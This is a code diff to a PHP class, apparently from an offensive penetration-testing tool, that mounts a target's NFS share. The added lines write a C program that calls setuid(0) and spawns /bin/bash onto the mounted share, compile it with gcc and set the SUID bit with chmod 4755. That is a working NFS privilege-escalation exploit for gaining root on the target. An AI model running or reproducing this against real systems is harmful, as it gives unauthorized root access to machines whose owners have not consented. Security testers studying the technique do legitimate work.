@@ -4,13 +4,14 @@
 class service2nfs extends service2netbios {
 
 
-    public function __construct($eth,$domain,$ip,$port,$service_protocol,$stream) {
-        parent::__construct($eth,$domain,$ip,$port,$service_protocol,$stream);
+    public function __construct($eth,$domain,$ip,$port,$service_protocol) {
+        parent::__construct($eth,$domain,$ip,$port,$service_protocol);
     }
 
 
 public function service2nfs2check4mount($path){
         $query = "echo '$this->root_passwd' | sudo -S mount -t nfs -o vers=3 -o nolock $this->ip:$path /tmp/$this->ip.$this->port.nfs 2>&1 "; // -o nolock
+        //$query = "echo '$this->root_passwd' | sudo -S mount -t nfs4 -o proto=tcp,port=$this->port $this->ip:$path /tmp/$this->ip.$this->port.nfs 2>&1 ";
         $check_mount = $this->req_ret_str($query);
         $this->article("CHECK MOUNT", $check_mount);
         if(stristr($check_mount,"access denied") !== false) return FALSE;
@@ -141,9 +142,40 @@ public function service2nfs2check4mount($path){
         $query = "ls -al $mounted_dir"; // sudo -u $find_user
         $this->req_ret_str($query);
         
+
         $query = "ls -anl $mounted_dir"; // sudo -u $find_user
         $this->req_ret_str($query);
         $this->pause();
+        
+        $suid = <<<EOC
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdlib.h>
+int main(){
+setuid(0);
+setgid(0);
+system("/bin/bash");
+return 0;
+}
+EOC;
+        $data = "echo '$suid' > $mounted_dir/bash.c ";
+        $this->req_ret_str($data);
+        $this->pause();
+        
+        $data = "gcc -o $mounted_dir/bash $mounted_dir/bash.c ";
+        $this->req_ret_str($data);
+        $this->pause();
+        
+        
+        $data = "chmod 4755 $mounted_dir/bash ";
+        $this->req_ret_str($data);
+        
+        $data = "ls -al $mounted_dir/bash";
+        $this->req_ret_str($data);
+        $this->pause();
+        
+        
         return $uid_name;
     }
     
